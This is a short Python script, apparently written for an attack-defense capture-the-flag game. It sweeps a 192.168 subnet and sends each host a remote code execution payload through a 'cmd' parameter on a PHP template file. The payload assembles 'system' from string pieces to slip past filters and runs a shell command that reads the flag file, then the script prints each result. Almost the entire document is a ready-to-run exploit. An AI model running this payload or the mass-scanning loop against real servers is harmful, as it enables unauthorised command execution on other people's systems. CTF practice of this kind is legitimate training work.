#coding=utf-8
import requests
import re
url_head="http://192.168."	#网段
url=""
command_addr="/core/app/inc/message_cn.tpl.php" #命令执行路径
port="80"
payload="?cmd=$a='syste';$b='m';$c=$a.$b;$c('cat /var/www/html/flag');"

for i in range(0,10):
	url=url_head+str(i)+".20:"+port+command_addr+payload
	try:
		rex=requests.get(url,timeout=1)
		html=rex.text
		content=re.sub(r"</?(.+?)>","",html) # 去除标签
		content=re.sub(r"&nbsp;","", content)#去除&nbsp;
		res=re.sub(r"\s+","", content)  # 去除空白字符
		result=url+"command sucess,flag is "+res
		print result
	except:
		print url+"command fail"